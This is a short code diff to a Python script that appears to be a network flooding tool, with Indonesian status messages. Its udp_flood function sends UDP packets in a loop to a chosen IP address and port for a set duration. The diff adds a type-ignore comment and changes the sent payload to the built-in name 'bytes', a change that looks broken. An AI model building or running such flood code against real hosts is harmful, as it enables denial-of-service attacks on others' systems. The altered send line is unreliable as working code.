@@ -1,7 +1,7 @@
 import os
 import subprocess
 import colorama
-import pyfiglet
+import pyfiglet # type: ignore
 import numpy as np
 import socket
 import random
@@ -58,7 +58,7 @@ def udp_flood(ip, port, duration):
     sent = 0
 
     while time.time() < timeout:
-        sock.sendto(bytes_data, (ip, port))
+        sock.sendto(bytes, (ip, port))
         sent += 1
         print(f"{fore.RED}mengirim paket ke {ip}:{port}({sent} paket yang terkirim){Style.RESET_ALL}")
 
